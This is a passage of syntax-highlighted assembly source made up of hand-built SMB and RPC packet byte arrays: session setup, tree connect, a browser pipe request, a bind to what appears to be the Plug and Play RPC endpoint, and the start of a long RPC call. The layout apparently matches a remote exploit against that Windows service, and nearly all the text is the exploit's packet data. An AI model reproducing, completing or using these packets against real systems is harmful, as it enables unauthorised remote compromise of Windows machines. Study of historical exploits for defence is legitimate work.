class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x6E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x64</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x6F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x77</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x73</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x20</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x30</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x30</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x30</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x20</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x35</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x2E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x30</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc0">
</span><span class="sc5">SMB_SessionSetupAndX2_LEN</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">SMB_SessionSetupAndX2</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">SMB_TreeConnectAndX</span><span class="sc0"> \
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x5A</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFF</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x53</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x42</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x75</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x07</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xC8</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFF</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFE</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x30</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x04</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFF</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x5A</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x01</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x2F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc0">
</span><span class="sc5">SMB_TreeConnectAndX_LEN</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">SMB_TreeConnectAndX</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">SMB_TreeConnectAndX_</span><span class="sc0">    \
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x3F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x3F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x3F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x3F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x3F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc0">
</span><span class="sc5">SMB_TreeConnectAndX__LEN</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">SMB_TreeConnectAndX_</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">SMB_PipeRequest_browser</span><span class="sc0">     \
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x66</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFF</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x53</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x42</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xA2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x07</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xC8</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x78</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x04</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x40</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFF</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xDE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xDE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x16</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x9F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x01</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x02</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x01</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x40</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x02</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x5C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x62</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x72</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x6F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x77</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x73</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x65</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x72</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc0">
</span><span class="sc5">SMB_PipeRequest_browser_LEN</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">SMB_PipeRequest_browser</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">SMB_PNPEndpoint</span><span class="sc0">     \
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x9C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFF</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x53</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x42</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x25</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x07</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xC8</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x78</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x04</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x50</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x48</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x54</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x48</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x54</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x02</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x26</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x40</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x59</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x5C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x50</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x49</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x50</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x45</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x5C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x40</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x05</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0B</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x48</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x01</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xB8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xB8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x01</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x01</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x40</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x9F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x8D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x3D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xA0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xCE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x11</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0x8F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x69</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x3E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x30</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x05</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1B</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x01</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x04</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x5D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x88</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x8A</span><span class="sc4">,</span><span class="sc0"> 
    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0xEB</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x1C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xC9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x11</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x9F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xE8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x2B</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x48</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x60</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x02</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc0">
</span><span class="sc5">SMB_PNPEndpoint_LEN</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">SMB_PNPEndpoint</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">RPC_call</span><span class="sc0">        \
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFF</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x53</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x42</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x25</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x07</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xC8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0">
